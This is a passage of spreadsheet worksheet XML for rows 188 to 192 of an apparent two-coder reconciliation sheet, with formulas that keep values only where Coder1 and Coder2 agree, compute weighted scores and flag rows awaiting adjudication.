        <f>IF(AND(Coder1!I188&amp;""&lt;&gt;"",Coder1!I188&amp;""=Coder2!I188&amp;""),Coder1!I188,"")</f>
        <v/>
      </c>
      <c r="J188" s="14">
        <f>IF(AND(Coder1!J188&amp;""&lt;&gt;"",Coder1!J188&amp;""=Coder2!J188&amp;""),Coder1!J188,"")</f>
        <v/>
      </c>
      <c r="K188" s="14">
        <f>IF(AND(Coder1!K188&amp;""&lt;&gt;"",Coder1!K188&amp;""=Coder2!K188&amp;""),Coder1!K188,"")</f>
        <v/>
      </c>
      <c r="L188" s="14">
        <f>IF(AND(Coder1!L188&amp;""&lt;&gt;"",Coder1!L188&amp;""=Coder2!L188&amp;""),Coder1!L188,"")</f>
        <v/>
      </c>
      <c r="M188" s="14">
        <f>IF(AND(Coder1!M188&amp;""&lt;&gt;"",Coder1!M188&amp;""=Coder2!M188&amp;""),Coder1!M188,"")</f>
        <v/>
      </c>
      <c r="N188" s="14">
        <f>IF(AND(Coder1!N188&amp;""&lt;&gt;"",Coder1!N188&amp;""=Coder2!N188&amp;""),Coder1!N188,"")</f>
        <v/>
      </c>
      <c r="O188" s="14">
        <f>IF(AND(Coder1!O188&amp;""&lt;&gt;"",Coder1!O188&amp;""=Coder2!O188&amp;""),Coder1!O188,"")</f>
        <v/>
      </c>
      <c r="P188" s="14">
        <f>IF(AND(Coder1!P188&amp;""&lt;&gt;"",Coder1!P188&amp;""=Coder2!P188&amp;""),Coder1!P188,"")</f>
        <v/>
      </c>
      <c r="Q188" s="14">
        <f>IF(AND(Coder1!Q188&amp;""&lt;&gt;"",Coder1!Q188&amp;""=Coder2!Q188&amp;""),Coder1!Q188,"")</f>
        <v/>
      </c>
      <c r="R188" s="14">
        <f>IF(AND(Coder1!R188&amp;""&lt;&gt;"",Coder1!R188&amp;""=Coder2!R188&amp;""),Coder1!R188,"")</f>
        <v/>
      </c>
      <c r="S188" s="14">
        <f>IF(AND(Coder1!S188&amp;""&lt;&gt;"",Coder1!S188&amp;""=Coder2!S188&amp;""),Coder1!S188,"")</f>
        <v/>
      </c>
      <c r="T188" s="14">
        <f>IF(AND(Coder1!T188&amp;""&lt;&gt;"",Coder1!T188&amp;""=Coder2!T188&amp;""),Coder1!T188,"")</f>
        <v/>
      </c>
      <c r="U188" s="14">
        <f>IF(AND(Coder1!U188&amp;""&lt;&gt;"",Coder1!U188&amp;""=Coder2!U188&amp;""),Coder1!U188,"")</f>
        <v/>
      </c>
      <c r="V188" s="14">
        <f>IF(AND(Coder1!V188&amp;""&lt;&gt;"",Coder1!V188&amp;""=Coder2!V188&amp;""),Coder1!V188,"")</f>
        <v/>
      </c>
      <c r="W188" s="14">
        <f>IF(AND(Coder1!W188&amp;""&lt;&gt;"",Coder1!W188&amp;""=Coder2!W188&amp;""),Coder1!W188,"")</f>
        <v/>
      </c>
      <c r="X188" s="14">
        <f>IF(AND(Coder1!X188&amp;""&lt;&gt;"",Coder1!X188&amp;""=Coder2!X188&amp;""),Coder1!X188,"")</f>
        <v/>
      </c>
      <c r="Y188" s="14">
        <f>IF(AND(Coder1!Y188&amp;""&lt;&gt;"",Coder1!Y188&amp;""=Coder2!Y188&amp;""),Coder1!Y188,"")</f>
        <v/>
      </c>
      <c r="Z188" s="14">
        <f>IF(AND(Coder1!Z188&amp;""&lt;&gt;"",Coder1!Z188&amp;""=Coder2!Z188&amp;""),Coder1!Z188,"")</f>
        <v/>
      </c>
      <c r="AA188" s="14">
        <f>IF(AND(Coder1!AA188&amp;""&lt;&gt;"",Coder1!AA188&amp;""=Coder2!AA188&amp;""),Coder1!AA188,"")</f>
        <v/>
      </c>
      <c r="AB188" s="14">
        <f>IF(AND(Coder1!AB188&amp;""&lt;&gt;"",Coder1!AB188&amp;""=Coder2!AB188&amp;""),Coder1!AB188,"")</f>
        <v/>
      </c>
      <c r="AC188" s="14">
        <f>IF(AND(Coder1!AC188&amp;""&lt;&gt;"",Coder1!AC188&amp;""=Coder2!AC188&amp;""),Coder1!AC188,"")</f>
        <v/>
      </c>
      <c r="AD188" s="14">
        <f>IF(AND(Coder1!AD188&amp;""&lt;&gt;"",Coder1!AD188&amp;""=Coder2!AD188&amp;""),Coder1!AD188,"")</f>
        <v/>
      </c>
      <c r="AE188" s="14">
        <f>IF(AND(Coder1!AE188&amp;""&lt;&gt;"",Coder1!AE188&amp;""=Coder2!AE188&amp;""),Coder1!AE188,"")</f>
        <v/>
      </c>
      <c r="AF188" s="14">
        <f>IF(AND(Coder1!AF188&amp;""&lt;&gt;"",Coder1!AF188&amp;""=Coder2!AF188&amp;""),Coder1!AF188,"")</f>
        <v/>
      </c>
      <c r="AG188" s="14">
        <f>IF(AND(Coder1!AG188&amp;""&lt;&gt;"",Coder1!AG188&amp;""=Coder2!AG188&amp;""),Coder1!AG188,"")</f>
        <v/>
      </c>
      <c r="AH188" s="14">
        <f>IF(AND(Coder1!AH188&amp;""&lt;&gt;"",Coder1!AH188&amp;""=Coder2!AH188&amp;""),Coder1!AH188,"")</f>
        <v/>
      </c>
      <c r="AI188" s="11">
        <f>IF(COUNT(E188:L188)=0,"",SUM(E188:L188))</f>
        <v/>
      </c>
      <c r="AJ188" s="11">
        <f>IF(AI188="","",N(E188)*3+N(F188)*2+N(G188)*2+N(H188)*2+N(I188)*2+N(J188)*3+N(K188)*3+N(L188)*3)</f>
        <v/>
      </c>
      <c r="AK188" s="11">
        <f>IF(AI188="","",COUNTIF(N188:AG188,1))</f>
        <v/>
      </c>
      <c r="AL188" s="11">
        <f>IF(OR(AJ188="",AJ188=0),"",ROUND(100*(AJ188-AK188)/AJ188,1))</f>
        <v/>
      </c>
      <c r="AM188" s="11">
        <f>IF(AND(Coder1!AN188=1,Coder2!AN188=1),IF(COUNTBLANK(E188:AH188)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN188" s="11">
        <f>IF(AND(Coder1!AN188=1,Coder2!AN188=1),IF(SUMPRODUCT(--(Coder1!E188:AH188&amp;""&lt;&gt;Coder2!E188:AH188&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO188" s="11" t="n"/>
    </row>
    <row r="189">
      <c r="A189" s="11">
        <f>Coder1!A189</f>
        <v/>
      </c>
      <c r="B189" s="11">
        <f>Coder1!B189</f>
        <v/>
      </c>
      <c r="C189" s="11">
        <f>Coder1!C189</f>
        <v/>
      </c>
      <c r="D189" s="11">
        <f>Coder1!D189</f>
        <v/>
      </c>
      <c r="E189" s="14">
        <f>IF(AND(Coder1!E189&amp;""&lt;&gt;"",Coder1!E189&amp;""=Coder2!E189&amp;""),Coder1!E189,"")</f>
        <v/>
      </c>
      <c r="F189" s="14">
        <f>IF(AND(Coder1!F189&amp;""&lt;&gt;"",Coder1!F189&amp;""=Coder2!F189&amp;""),Coder1!F189,"")</f>
        <v/>
      </c>
      <c r="G189" s="14">
        <f>IF(AND(Coder1!G189&amp;""&lt;&gt;"",Coder1!G189&amp;""=Coder2!G189&amp;""),Coder1!G189,"")</f>
        <v/>
      </c>
      <c r="H189" s="14">
        <f>IF(AND(Coder1!H189&amp;""&lt;&gt;"",Coder1!H189&amp;""=Coder2!H189&amp;""),Coder1!H189,"")</f>
        <v/>
      </c>
      <c r="I189" s="14">
        <f>IF(AND(Coder1!I189&amp;""&lt;&gt;"",Coder1!I189&amp;""=Coder2!I189&amp;""),Coder1!I189,"")</f>
        <v/>
      </c>
      <c r="J189" s="14">
        <f>IF(AND(Coder1!J189&amp;""&lt;&gt;"",Coder1!J189&amp;""=Coder2!J189&amp;""),Coder1!J189,"")</f>
        <v/>
      </c>
      <c r="K189" s="14">
        <f>IF(AND(Coder1!K189&amp;""&lt;&gt;"",Coder1!K189&amp;""=Coder2!K189&amp;""),Coder1!K189,"")</f>
        <v/>
      </c>
      <c r="L189" s="14">
        <f>IF(AND(Coder1!L189&amp;""&lt;&gt;"",Coder1!L189&amp;""=Coder2!L189&amp;""),Coder1!L189,"")</f>
        <v/>
      </c>
      <c r="M189" s="14">
        <f>IF(AND(Coder1!M189&amp;""&lt;&gt;"",Coder1!M189&amp;""=Coder2!M189&amp;""),Coder1!M189,"")</f>
        <v/>
      </c>
      <c r="N189" s="14">
        <f>IF(AND(Coder1!N189&amp;""&lt;&gt;"",Coder1!N189&amp;""=Coder2!N189&amp;""),Coder1!N189,"")</f>
        <v/>
      </c>
      <c r="O189" s="14">
        <f>IF(AND(Coder1!O189&amp;""&lt;&gt;"",Coder1!O189&amp;""=Coder2!O189&amp;""),Coder1!O189,"")</f>
        <v/>
      </c>
      <c r="P189" s="14">
        <f>IF(AND(Coder1!P189&amp;""&lt;&gt;"",Coder1!P189&amp;""=Coder2!P189&amp;""),Coder1!P189,"")</f>
        <v/>
      </c>
      <c r="Q189" s="14">
        <f>IF(AND(Coder1!Q189&amp;""&lt;&gt;"",Coder1!Q189&amp;""=Coder2!Q189&amp;""),Coder1!Q189,"")</f>
        <v/>
      </c>
      <c r="R189" s="14">
        <f>IF(AND(Coder1!R189&amp;""&lt;&gt;"",Coder1!R189&amp;""=Coder2!R189&amp;""),Coder1!R189,"")</f>
        <v/>
      </c>
      <c r="S189" s="14">
        <f>IF(AND(Coder1!S189&amp;""&lt;&gt;"",Coder1!S189&amp;""=Coder2!S189&amp;""),Coder1!S189,"")</f>
        <v/>
      </c>
      <c r="T189" s="14">
        <f>IF(AND(Coder1!T189&amp;""&lt;&gt;"",Coder1!T189&amp;""=Coder2!T189&amp;""),Coder1!T189,"")</f>
        <v/>
      </c>
      <c r="U189" s="14">
        <f>IF(AND(Coder1!U189&amp;""&lt;&gt;"",Coder1!U189&amp;""=Coder2!U189&amp;""),Coder1!U189,"")</f>
        <v/>
      </c>
      <c r="V189" s="14">
        <f>IF(AND(Coder1!V189&amp;""&lt;&gt;"",Coder1!V189&amp;""=Coder2!V189&amp;""),Coder1!V189,"")</f>
        <v/>
      </c>
      <c r="W189" s="14">
        <f>IF(AND(Coder1!W189&amp;""&lt;&gt;"",Coder1!W189&amp;""=Coder2!W189&amp;""),Coder1!W189,"")</f>
        <v/>
      </c>
      <c r="X189" s="14">
        <f>IF(AND(Coder1!X189&amp;""&lt;&gt;"",Coder1!X189&amp;""=Coder2!X189&amp;""),Coder1!X189,"")</f>
        <v/>
      </c>
      <c r="Y189" s="14">
        <f>IF(AND(Coder1!Y189&amp;""&lt;&gt;"",Coder1!Y189&amp;""=Coder2!Y189&amp;""),Coder1!Y189,"")</f>
        <v/>
      </c>
      <c r="Z189" s="14">
        <f>IF(AND(Coder1!Z189&amp;""&lt;&gt;"",Coder1!Z189&amp;""=Coder2!Z189&amp;""),Coder1!Z189,"")</f>
        <v/>
      </c>
      <c r="AA189" s="14">
        <f>IF(AND(Coder1!AA189&amp;""&lt;&gt;"",Coder1!AA189&amp;""=Coder2!AA189&amp;""),Coder1!AA189,"")</f>
        <v/>
      </c>
      <c r="AB189" s="14">
        <f>IF(AND(Coder1!AB189&amp;""&lt;&gt;"",Coder1!AB189&amp;""=Coder2!AB189&amp;""),Coder1!AB189,"")</f>
        <v/>
      </c>
      <c r="AC189" s="14">
        <f>IF(AND(Coder1!AC189&amp;""&lt;&gt;"",Coder1!AC189&amp;""=Coder2!AC189&amp;""),Coder1!AC189,"")</f>
        <v/>
      </c>
      <c r="AD189" s="14">
        <f>IF(AND(Coder1!AD189&amp;""&lt;&gt;"",Coder1!AD189&amp;""=Coder2!AD189&amp;""),Coder1!AD189,"")</f>
        <v/>
      </c>
      <c r="AE189" s="14">
        <f>IF(AND(Coder1!AE189&amp;""&lt;&gt;"",Coder1!AE189&amp;""=Coder2!AE189&amp;""),Coder1!AE189,"")</f>
        <v/>
      </c>
      <c r="AF189" s="14">
        <f>IF(AND(Coder1!AF189&amp;""&lt;&gt;"",Coder1!AF189&amp;""=Coder2!AF189&amp;""),Coder1!AF189,"")</f>
        <v/>
      </c>
      <c r="AG189" s="14">
        <f>IF(AND(Coder1!AG189&amp;""&lt;&gt;"",Coder1!AG189&amp;""=Coder2!AG189&amp;""),Coder1!AG189,"")</f>
        <v/>
      </c>
      <c r="AH189" s="14">
        <f>IF(AND(Coder1!AH189&amp;""&lt;&gt;"",Coder1!AH189&amp;""=Coder2!AH189&amp;""),Coder1!AH189,"")</f>
        <v/>
      </c>
      <c r="AI189" s="11">
        <f>IF(COUNT(E189:L189)=0,"",SUM(E189:L189))</f>
        <v/>
      </c>
      <c r="AJ189" s="11">
        <f>IF(AI189="","",N(E189)*3+N(F189)*2+N(G189)*2+N(H189)*2+N(I189)*2+N(J189)*3+N(K189)*3+N(L189)*3)</f>
        <v/>
      </c>
      <c r="AK189" s="11">
        <f>IF(AI189="","",COUNTIF(N189:AG189,1))</f>
        <v/>
      </c>
      <c r="AL189" s="11">
        <f>IF(OR(AJ189="",AJ189=0),"",ROUND(100*(AJ189-AK189)/AJ189,1))</f>
        <v/>
      </c>
      <c r="AM189" s="11">
        <f>IF(AND(Coder1!AN189=1,Coder2!AN189=1),IF(COUNTBLANK(E189:AH189)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN189" s="11">
        <f>IF(AND(Coder1!AN189=1,Coder2!AN189=1),IF(SUMPRODUCT(--(Coder1!E189:AH189&amp;""&lt;&gt;Coder2!E189:AH189&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO189" s="11" t="n"/>
    </row>
    <row r="190">
      <c r="A190" s="11">
        <f>Coder1!A190</f>
        <v/>
      </c>
      <c r="B190" s="11">
        <f>Coder1!B190</f>
        <v/>
      </c>
      <c r="C190" s="11">
        <f>Coder1!C190</f>
        <v/>
      </c>
      <c r="D190" s="11">
        <f>Coder1!D190</f>
        <v/>
      </c>
      <c r="E190" s="14">
        <f>IF(AND(Coder1!E190&amp;""&lt;&gt;"",Coder1!E190&amp;""=Coder2!E190&amp;""),Coder1!E190,"")</f>
        <v/>
      </c>
      <c r="F190" s="14">
        <f>IF(AND(Coder1!F190&amp;""&lt;&gt;"",Coder1!F190&amp;""=Coder2!F190&amp;""),Coder1!F190,"")</f>
        <v/>
      </c>
      <c r="G190" s="14">
        <f>IF(AND(Coder1!G190&amp;""&lt;&gt;"",Coder1!G190&amp;""=Coder2!G190&amp;""),Coder1!G190,"")</f>
        <v/>
      </c>
      <c r="H190" s="14">
        <f>IF(AND(Coder1!H190&amp;""&lt;&gt;"",Coder1!H190&amp;""=Coder2!H190&amp;""),Coder1!H190,"")</f>
        <v/>
      </c>
      <c r="I190" s="14">
        <f>IF(AND(Coder1!I190&amp;""&lt;&gt;"",Coder1!I190&amp;""=Coder2!I190&amp;""),Coder1!I190,"")</f>
        <v/>
      </c>
      <c r="J190" s="14">
        <f>IF(AND(Coder1!J190&amp;""&lt;&gt;"",Coder1!J190&amp;""=Coder2!J190&amp;""),Coder1!J190,"")</f>
        <v/>
      </c>
      <c r="K190" s="14">
        <f>IF(AND(Coder1!K190&amp;""&lt;&gt;"",Coder1!K190&amp;""=Coder2!K190&amp;""),Coder1!K190,"")</f>
        <v/>
      </c>
      <c r="L190" s="14">
        <f>IF(AND(Coder1!L190&amp;""&lt;&gt;"",Coder1!L190&amp;""=Coder2!L190&amp;""),Coder1!L190,"")</f>
        <v/>
      </c>
      <c r="M190" s="14">
        <f>IF(AND(Coder1!M190&amp;""&lt;&gt;"",Coder1!M190&amp;""=Coder2!M190&amp;""),Coder1!M190,"")</f>
        <v/>
      </c>
      <c r="N190" s="14">
        <f>IF(AND(Coder1!N190&amp;""&lt;&gt;"",Coder1!N190&amp;""=Coder2!N190&amp;""),Coder1!N190,"")</f>
        <v/>
      </c>
      <c r="O190" s="14">
        <f>IF(AND(Coder1!O190&amp;""&lt;&gt;"",Coder1!O190&amp;""=Coder2!O190&amp;""),Coder1!O190,"")</f>
        <v/>
      </c>
      <c r="P190" s="14">
        <f>IF(AND(Coder1!P190&amp;""&lt;&gt;"",Coder1!P190&amp;""=Coder2!P190&amp;""),Coder1!P190,"")</f>
        <v/>
      </c>
      <c r="Q190" s="14">
        <f>IF(AND(Coder1!Q190&amp;""&lt;&gt;"",Coder1!Q190&amp;""=Coder2!Q190&amp;""),Coder1!Q190,"")</f>
        <v/>
      </c>
      <c r="R190" s="14">
        <f>IF(AND(Coder1!R190&amp;""&lt;&gt;"",Coder1!R190&amp;""=Coder2!R190&amp;""),Coder1!R190,"")</f>
        <v/>
      </c>
      <c r="S190" s="14">
        <f>IF(AND(Coder1!S190&amp;""&lt;&gt;"",Coder1!S190&amp;""=Coder2!S190&amp;""),Coder1!S190,"")</f>
        <v/>
      </c>
      <c r="T190" s="14">
        <f>IF(AND(Coder1!T190&amp;""&lt;&gt;"",Coder1!T190&amp;""=Coder2!T190&amp;""),Coder1!T190,"")</f>
        <v/>
      </c>
      <c r="U190" s="14">
        <f>IF(AND(Coder1!U190&amp;""&lt;&gt;"",Coder1!U190&amp;""=Coder2!U190&amp;""),Coder1!U190,"")</f>
        <v/>
      </c>
      <c r="V190" s="14">
        <f>IF(AND(Coder1!V190&amp;""&lt;&gt;"",Coder1!V190&amp;""=Coder2!V190&amp;""),Coder1!V190,"")</f>
        <v/>
      </c>
      <c r="W190" s="14">
        <f>IF(AND(Coder1!W190&amp;""&lt;&gt;"",Coder1!W190&amp;""=Coder2!W190&amp;""),Coder1!W190,"")</f>
        <v/>
      </c>
      <c r="X190" s="14">
        <f>IF(AND(Coder1!X190&amp;""&lt;&gt;"",Coder1!X190&amp;""=Coder2!X190&amp;""),Coder1!X190,"")</f>
        <v/>
      </c>
      <c r="Y190" s="14">
        <f>IF(AND(Coder1!Y190&amp;""&lt;&gt;"",Coder1!Y190&amp;""=Coder2!Y190&amp;""),Coder1!Y190,"")</f>
        <v/>
      </c>
      <c r="Z190" s="14">
        <f>IF(AND(Coder1!Z190&amp;""&lt;&gt;"",Coder1!Z190&amp;""=Coder2!Z190&amp;""),Coder1!Z190,"")</f>
        <v/>
      </c>
      <c r="AA190" s="14">
        <f>IF(AND(Coder1!AA190&amp;""&lt;&gt;"",Coder1!AA190&amp;""=Coder2!AA190&amp;""),Coder1!AA190,"")</f>
        <v/>
      </c>
      <c r="AB190" s="14">
        <f>IF(AND(Coder1!AB190&amp;""&lt;&gt;"",Coder1!AB190&amp;""=Coder2!AB190&amp;""),Coder1!AB190,"")</f>
        <v/>
      </c>
      <c r="AC190" s="14">
        <f>IF(AND(Coder1!AC190&amp;""&lt;&gt;"",Coder1!AC190&amp;""=Coder2!AC190&amp;""),Coder1!AC190,"")</f>
        <v/>
      </c>
      <c r="AD190" s="14">
        <f>IF(AND(Coder1!AD190&amp;""&lt;&gt;"",Coder1!AD190&amp;""=Coder2!AD190&amp;""),Coder1!AD190,"")</f>
        <v/>
      </c>
      <c r="AE190" s="14">
        <f>IF(AND(Coder1!AE190&amp;""&lt;&gt;"",Coder1!AE190&amp;""=Coder2!AE190&amp;""),Coder1!AE190,"")</f>
        <v/>
      </c>
      <c r="AF190" s="14">
        <f>IF(AND(Coder1!AF190&amp;""&lt;&gt;"",Coder1!AF190&amp;""=Coder2!AF190&amp;""),Coder1!AF190,"")</f>
        <v/>
      </c>
      <c r="AG190" s="14">
        <f>IF(AND(Coder1!AG190&amp;""&lt;&gt;"",Coder1!AG190&amp;""=Coder2!AG190&amp;""),Coder1!AG190,"")</f>
        <v/>
      </c>
      <c r="AH190" s="14">
        <f>IF(AND(Coder1!AH190&amp;""&lt;&gt;"",Coder1!AH190&amp;""=Coder2!AH190&amp;""),Coder1!AH190,"")</f>
        <v/>
      </c>
      <c r="AI190" s="11">
        <f>IF(COUNT(E190:L190)=0,"",SUM(E190:L190))</f>
        <v/>
      </c>
      <c r="AJ190" s="11">
        <f>IF(AI190="","",N(E190)*3+N(F190)*2+N(G190)*2+N(H190)*2+N(I190)*2+N(J190)*3+N(K190)*3+N(L190)*3)</f>
        <v/>
      </c>
      <c r="AK190" s="11">
        <f>IF(AI190="","",COUNTIF(N190:AG190,1))</f>
        <v/>
      </c>
      <c r="AL190" s="11">
        <f>IF(OR(AJ190="",AJ190=0),"",ROUND(100*(AJ190-AK190)/AJ190,1))</f>
        <v/>
      </c>
      <c r="AM190" s="11">
        <f>IF(AND(Coder1!AN190=1,Coder2!AN190=1),IF(COUNTBLANK(E190:AH190)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN190" s="11">
        <f>IF(AND(Coder1!AN190=1,Coder2!AN190=1),IF(SUMPRODUCT(--(Coder1!E190:AH190&amp;""&lt;&gt;Coder2!E190:AH190&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO190" s="11" t="n"/>
    </row>
    <row r="191">
      <c r="A191" s="11">
        <f>Coder1!A191</f>
        <v/>
      </c>
      <c r="B191" s="11">
        <f>Coder1!B191</f>
        <v/>
      </c>
      <c r="C191" s="11">
        <f>Coder1!C191</f>
        <v/>
      </c>
      <c r="D191" s="11">
        <f>Coder1!D191</f>
        <v/>
      </c>
      <c r="E191" s="14">
        <f>IF(AND(Coder1!E191&amp;""&lt;&gt;"",Coder1!E191&amp;""=Coder2!E191&amp;""),Coder1!E191,"")</f>
        <v/>
      </c>
      <c r="F191" s="14">
        <f>IF(AND(Coder1!F191&amp;""&lt;&gt;"",Coder1!F191&amp;""=Coder2!F191&amp;""),Coder1!F191,"")</f>
        <v/>
      </c>
      <c r="G191" s="14">
        <f>IF(AND(Coder1!G191&amp;""&lt;&gt;"",Coder1!G191&amp;""=Coder2!G191&amp;""),Coder1!G191,"")</f>
        <v/>
      </c>
      <c r="H191" s="14">
        <f>IF(AND(Coder1!H191&amp;""&lt;&gt;"",Coder1!H191&amp;""=Coder2!H191&amp;""),Coder1!H191,"")</f>
        <v/>
      </c>
      <c r="I191" s="14">
        <f>IF(AND(Coder1!I191&amp;""&lt;&gt;"",Coder1!I191&amp;""=Coder2!I191&amp;""),Coder1!I191,"")</f>
        <v/>
      </c>
      <c r="J191" s="14">
        <f>IF(AND(Coder1!J191&amp;""&lt;&gt;"",Coder1!J191&amp;""=Coder2!J191&amp;""),Coder1!J191,"")</f>
        <v/>
      </c>
      <c r="K191" s="14">
        <f>IF(AND(Coder1!K191&amp;""&lt;&gt;"",Coder1!K191&amp;""=Coder2!K191&amp;""),Coder1!K191,"")</f>
        <v/>
      </c>
      <c r="L191" s="14">
        <f>IF(AND(Coder1!L191&amp;""&lt;&gt;"",Coder1!L191&amp;""=Coder2!L191&amp;""),Coder1!L191,"")</f>
        <v/>
      </c>
      <c r="M191" s="14">
        <f>IF(AND(Coder1!M191&amp;""&lt;&gt;"",Coder1!M191&amp;""=Coder2!M191&amp;""),Coder1!M191,"")</f>
        <v/>
      </c>
      <c r="N191" s="14">
        <f>IF(AND(Coder1!N191&amp;""&lt;&gt;"",Coder1!N191&amp;""=Coder2!N191&amp;""),Coder1!N191,"")</f>
        <v/>
      </c>
      <c r="O191" s="14">
        <f>IF(AND(Coder1!O191&amp;""&lt;&gt;"",Coder1!O191&amp;""=Coder2!O191&amp;""),Coder1!O191,"")</f>
        <v/>
      </c>
      <c r="P191" s="14">
        <f>IF(AND(Coder1!P191&amp;""&lt;&gt;"",Coder1!P191&amp;""=Coder2!P191&amp;""),Coder1!P191,"")</f>
        <v/>
      </c>
      <c r="Q191" s="14">
        <f>IF(AND(Coder1!Q191&amp;""&lt;&gt;"",Coder1!Q191&amp;""=Coder2!Q191&amp;""),Coder1!Q191,"")</f>
        <v/>
      </c>
      <c r="R191" s="14">
        <f>IF(AND(Coder1!R191&amp;""&lt;&gt;"",Coder1!R191&amp;""=Coder2!R191&amp;""),Coder1!R191,"")</f>
        <v/>
      </c>
      <c r="S191" s="14">
        <f>IF(AND(Coder1!S191&amp;""&lt;&gt;"",Coder1!S191&amp;""=Coder2!S191&amp;""),Coder1!S191,"")</f>
        <v/>
      </c>
      <c r="T191" s="14">
        <f>IF(AND(Coder1!T191&amp;""&lt;&gt;"",Coder1!T191&amp;""=Coder2!T191&amp;""),Coder1!T191,"")</f>
        <v/>
      </c>
      <c r="U191" s="14">
        <f>IF(AND(Coder1!U191&amp;""&lt;&gt;"",Coder1!U191&amp;""=Coder2!U191&amp;""),Coder1!U191,"")</f>
        <v/>
      </c>
      <c r="V191" s="14">
        <f>IF(AND(Coder1!V191&amp;""&lt;&gt;"",Coder1!V191&amp;""=Coder2!V191&amp;""),Coder1!V191,"")</f>
        <v/>
      </c>
      <c r="W191" s="14">
        <f>IF(AND(Coder1!W191&amp;""&lt;&gt;"",Coder1!W191&amp;""=Coder2!W191&amp;""),Coder1!W191,"")</f>
        <v/>
      </c>
      <c r="X191" s="14">
        <f>IF(AND(Coder1!X191&amp;""&lt;&gt;"",Coder1!X191&amp;""=Coder2!X191&amp;""),Coder1!X191,"")</f>
        <v/>
      </c>
      <c r="Y191" s="14">
        <f>IF(AND(Coder1!Y191&amp;""&lt;&gt;"",Coder1!Y191&amp;""=Coder2!Y191&amp;""),Coder1!Y191,"")</f>
        <v/>
      </c>
      <c r="Z191" s="14">
        <f>IF(AND(Coder1!Z191&amp;""&lt;&gt;"",Coder1!Z191&amp;""=Coder2!Z191&amp;""),Coder1!Z191,"")</f>
        <v/>
      </c>
      <c r="AA191" s="14">
        <f>IF(AND(Coder1!AA191&amp;""&lt;&gt;"",Coder1!AA191&amp;""=Coder2!AA191&amp;""),Coder1!AA191,"")</f>
        <v/>
      </c>
      <c r="AB191" s="14">
        <f>IF(AND(Coder1!AB191&amp;""&lt;&gt;"",Coder1!AB191&amp;""=Coder2!AB191&amp;""),Coder1!AB191,"")</f>
        <v/>
      </c>
      <c r="AC191" s="14">
        <f>IF(AND(Coder1!AC191&amp;""&lt;&gt;"",Coder1!AC191&amp;""=Coder2!AC191&amp;""),Coder1!AC191,"")</f>
        <v/>
      </c>
      <c r="AD191" s="14">
        <f>IF(AND(Coder1!AD191&amp;""&lt;&gt;"",Coder1!AD191&amp;""=Coder2!AD191&amp;""),Coder1!AD191,"")</f>
        <v/>
      </c>
      <c r="AE191" s="14">
        <f>IF(AND(Coder1!AE191&amp;""&lt;&gt;"",Coder1!AE191&amp;""=Coder2!AE191&amp;""),Coder1!AE191,"")</f>
        <v/>
      </c>
      <c r="AF191" s="14">
        <f>IF(AND(Coder1!AF191&amp;""&lt;&gt;"",Coder1!AF191&amp;""=Coder2!AF191&amp;""),Coder1!AF191,"")</f>
        <v/>
      </c>
      <c r="AG191" s="14">
        <f>IF(AND(Coder1!AG191&amp;""&lt;&gt;"",Coder1!AG191&amp;""=Coder2!AG191&amp;""),Coder1!AG191,"")</f>
        <v/>
      </c>
      <c r="AH191" s="14">
        <f>IF(AND(Coder1!AH191&amp;""&lt;&gt;"",Coder1!AH191&amp;""=Coder2!AH191&amp;""),Coder1!AH191,"")</f>
        <v/>
      </c>
      <c r="AI191" s="11">
        <f>IF(COUNT(E191:L191)=0,"",SUM(E191:L191))</f>
        <v/>
      </c>
      <c r="AJ191" s="11">
        <f>IF(AI191="","",N(E191)*3+N(F191)*2+N(G191)*2+N(H191)*2+N(I191)*2+N(J191)*3+N(K191)*3+N(L191)*3)</f>
        <v/>
      </c>
      <c r="AK191" s="11">
        <f>IF(AI191="","",COUNTIF(N191:AG191,1))</f>
        <v/>
      </c>
      <c r="AL191" s="11">
        <f>IF(OR(AJ191="",AJ191=0),"",ROUND(100*(AJ191-AK191)/AJ191,1))</f>
        <v/>
      </c>
      <c r="AM191" s="11">
        <f>IF(AND(Coder1!AN191=1,Coder2!AN191=1),IF(COUNTBLANK(E191:AH191)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN191" s="11">
        <f>IF(AND(Coder1!AN191=1,Coder2!AN191=1),IF(SUMPRODUCT(--(Coder1!E191:AH191&amp;""&lt;&gt;Coder2!E191:AH191&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO191" s="11" t="n"/>
    </row>
    <row r="192">
      <c r="A192" s="11">
        <f>Coder1!A192</f>
        <v/>
      </c>
      <c r="B192" s="11">
        <f>Coder1!B192</f>
        <v/>
      </c>
      <c r="C192" s="11">
        <f>Coder1!C192</f>
        <v/>
      </c>
      <c r="D192" s="11">
        <f>Coder1!D192</f>
        <v/>
      </c>
      <c r="E192" s="14">
        <f>IF(AND(Coder1!E192&amp;""&lt;&gt;"",Coder1!E192&amp;""=Coder2!E192&amp;""),Coder1!E192,"")</f>
        <v/>
      </c>
      <c r="F192" s="14">
        <f>IF(AND(Coder1!F192&amp;""&lt;&gt;"",Coder1!F192&amp;""=Coder2!F192&amp;""),Coder1!F192,"")</f>
        <v/>
      </c>
      <c r="G192" s="14">
        <f>IF(AND(Coder1!G192&amp;""&lt;&gt;"",Coder1!G192&amp;""=Coder2!G192&amp;""),Coder1!G192,"")</f>
        <v/>
      </c>
      <c r="H192" s="14">
        <f>IF(AND(Coder1!H192&amp;""&lt;&gt;"",Coder1!H192&amp;""=Coder2!H192&amp;""),Coder1!H192,"")</f>
        <v/>
      </c>
      <c r="I192" s="14">
        <f>IF(AND(Coder1!I192&amp;""&lt;&gt;"",Coder1!I192&amp;""=Coder2!I192&amp;""),Coder1!I192,"")</f>
        <v/>
      </c>
      <c r="J192" s="14">
        <f>IF(AND(Coder1!J192&amp;""&lt;&gt;"",Coder1!J192&amp;""=Coder2!J192&amp;""),Coder1!J192,"")</f>
        <v/>
      </c>
      <c r="K192" s="14">
        <f>IF(AND(Coder1!K192&amp;""&lt;&gt;"",Coder1!K192&amp;""=Coder2!K192&amp;""),Coder1!K192,"")</f>
        <v/>
      </c>
      <c r="L192" s="14">
